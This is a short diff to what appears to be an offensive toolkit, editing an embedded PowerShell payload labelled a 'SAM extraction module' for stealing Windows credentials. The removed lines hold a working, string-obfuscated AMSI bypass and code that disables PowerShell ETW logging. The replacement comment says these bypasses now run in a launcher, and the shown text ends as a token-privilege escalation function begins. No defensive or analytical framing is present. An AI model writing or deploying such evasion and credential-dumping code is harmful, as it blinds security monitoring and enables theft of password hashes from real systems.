@@ -4,15 +4,7 @@
 payload_code = r'''# Decoded payload - SAM extraction module
 param($Context)
 
-$a = [Ref].Assembly.GetType(('System.Management.Automation.'+('Am'+'siUt'+'ils')))
-$b = $a.GetField(('am'+'siInit'+'Failed'),'NonPublic,Static')
-$b.SetValue($null,$true)
-
-$etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-if ($etwProvider) {
-    $etwField = $etwProvider.GetField('etwProvider','NonPublic,Static')
-    if ($etwField) { $etwField.SetValue($null, $null) }
-}
+# Bypasses already executed in launcher - proceed directly to functionality
 
 function Enable-TokenPrivilege {
     param([string]$Privilege)
